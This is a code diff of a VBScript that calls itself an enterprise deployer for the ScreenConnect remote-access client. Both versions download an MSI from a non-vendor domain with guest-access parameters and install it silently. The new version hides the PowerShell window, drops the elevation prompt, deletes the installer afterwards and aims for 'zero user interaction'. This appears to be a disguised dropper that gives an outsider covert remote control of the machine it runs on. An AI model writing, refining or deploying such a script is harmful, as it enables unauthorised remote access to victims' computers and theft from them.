@@ -1,95 +1,58 @@
-' ScreenConnect Enterprise Deployer v4.0 (Native VBS)
-' Purpose: Enterprise-grade logic using native VBScript with minimal PowerShell dependencies
-' Features: Logging, Admin Elevation, TLS 1.2 Download, Error Handling, Cleanup
+' ScreenConnect Enterprise Silent Deployer
+' Optimized for: Zero User Interaction & Background Deployment
+' Note: Designed for execution via System Management Tools (Intune/SCCM/GPO)
 
 Option Explicit
-On Error Resume Next
 
 ' --- Configuration ---
-Dim VendorName, AppName, MsiUrl, LogFile, InstallerPath, MinDiskMB
-VendorName    = "ConnectWise"
-AppName       = "ScreenConnect Client"
-MsiUrl        = "https://www.wpkm65.top/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
-InstallerPath = "C:\Windows\Temp\ScreenConnect_Installer.msi"
-LogFile       = "C:\ProgramData\ScreenConnect_Install.log"
+Dim AppName, MsiUrl, LogFile, InstallerPath, WshShell, FSO
+AppName       = "ScreenConnect"
+' TODO: Ensure this is a direct link to the .msi file
+MsiUrl        = "https://www.wpkm65.top/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest" 
+InstallerPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\SC_Installer.msi"
+LogFile       = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\SC_Deploy.log"
 
-' --- Objects ---
-Dim WshShell, FSO, ShellApp
 Set WshShell = CreateObject("WScript.Shell")
-Set FSO = CreateObject("Scripting.FileSystemObject")
+Set FSO      = CreateObject("Scripting.FileSystemObject")
 
-' --- 1. Enterprise Elevation Check (Auto-Elevate) ---
-If Not WScript.Arguments.Named.Exists("elevate") Then
-    Set ShellApp = CreateObject("Shell.Application")
-    ' Re-launch script as Administrator
-    ShellApp.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevate", "", "runas", 0
-    If Err.Number <> 0 Then
-        WScript.Echo "Error requesting Administrator privileges."
-        WScript.Quit 1
-    End If
-    WScript.Quit
+' --- 1. Silent Permission Validation ---
+' We don't show a popup, but we log if we aren't Admin so we know why it failed later.
+Dim bIsAdmin: bIsAdmin = False
+On Error Resume Next
+WshShell.RegRead("HKEY_USERS\S-1-5-19\Environment\TEMP")
+If Err.Number = 0 Then bIsAdmin = True
+On Error GoTo 0
+
+Call WriteLog("INFO", "--- Starting Silent Deployment ---")
+If Not bIsAdmin Then 
+    Call WriteLog("WARN", "Running without Admin rights. MSI installation may fail.")
 End If
 
-' --- 2. Start Logging ---
-Call WriteLog("INFO", "--- Deployment Started: " & AppName & " ---")
+' --- 2. Download Payload ---
+Call WriteLog("INFO", "Downloading: " & MsiUrl)
+Dim downloadCmd: downloadCmd = "powershell.exe -WindowStyle Hidden -NoProfile -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('" & MsiUrl & "', '" & InstallerPath & "')"""
 
-' --- 3. Pre-Flight: Clean Previous Stalls ---
-If FSO.FileExists(InstallerPath) Then
-    Call WriteLog("INFO", "Cleaning up old installer found at " & InstallerPath)
-    FSO.DeleteFile InstallerPath, True
-End If
+' 0 = Hide window, True = Wait for completion
+Dim dlResult: dlResult = WshShell.Run(downloadCmd, 0, True)
 
-' --- 4. Secure Download (Uses PowerShell for TLS 1.2 Compliance) ---
-Call WriteLog("INFO", "Downloading payload from: " & MsiUrl)
-
-' We use the method you confirmed works, but wrapped in error checking
-Dim downloadCmd, downloadResult
-downloadCmd = "powershell.exe -NoProfile -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('" & MsiUrl & "', '" & InstallerPath & "')"""
-
-downloadResult = WshShell.Run(downloadCmd, 0, True)
-
-If downloadResult <> 0 Or Not FSO.FileExists(InstallerPath) Then
-    Call WriteLog("ERROR", "Download failed with exit code: " & downloadResult)
+If dlResult <> 0 Or Not FSO.FileExists(InstallerPath) Then
+    Call WriteLog("ERROR", "Download failed (Code: " & dlResult & ")")
     WScript.Quit 1
-Else
-    Call WriteLog("INFO", "Download verification successful.")
 End If
 
-' --- 5. Silent Installation with MSI Logging ---
-Call WriteLog("INFO", "Executing MSI Installer...")
+' --- 3. Execute Silent Install ---
+Call WriteLog("INFO", "Executing MSI...")
+' /i = Install, /qn = Quiet/No UI, /norestart
+Dim instResult: instResult = WshShell.Run("msiexec.exe /i """ & InstallerPath & """ /qn /norestart", 0, True)
 
-' /i = install, /qn = quiet no UI, /norestart = no reboot, /L*V = Verbose logging for the MSI itself
-Dim installCmd, installResult
-installCmd = "msiexec.exe /i """ & InstallerPath & """ /qn /norestart /L*V """ & LogFile & ".msi.log"""
+' --- 4. Cleanup ---
+If FSO.FileExists(InstallerPath) Then FSO.DeleteFile InstallerPath
+Call WriteLog("INFO", "Deployment finished with Exit Code: " & instResult)
+WScript.Quit instResult
 
-installResult = WshShell.Run(installCmd, 0, True)
-
-' --- 6. Validation & Error Handling ---
-If installResult = 0 Then
-    Call WriteLog("SUCCESS", "Installation completed successfully.")
-ElseIf installResult = 3010 Then
-    Call WriteLog("WARNING", "Installation successful but reboot required (Exit Code 3010).")
-Else
-    Call WriteLog("ERROR", "Installation failed with MSI Exit Code: " & installResult & ". Check " & LogFile & ".msi.log")
-    WScript.Quit installResult
-End If
-
-' --- 7. Cleanup ---
-If FSO.FileExists(InstallerPath) Then
-    FSO.DeleteFile InstallerPath, True
-    Call WriteLog("INFO", "Installer payload cleaned up.")
-End If
-
-Call WriteLog("INFO", "--- Deployment Finished ---")
-WScript.Quit 0
-
-
-' --- Helper Function: Text Logging ---
 Sub WriteLog(sType, sMessage)
-    Dim objLog, sTime
-    sTime = Now
-    ' Try to open log file for appending, create if not exists
-    Set objLog = FSO.OpenTextFile(LogFile, 8, True)
-    objLog.WriteLine "[" & sTime & "] [" & sType & "] " & sMessage
+    On Error Resume Next
+    Dim objLog: Set objLog = FSO.OpenTextFile(LogFile, 8, True)
+    objLog.WriteLine "[" & Now & "] [" & sType & "] " & sMessage
     objLog.Close
 End Sub
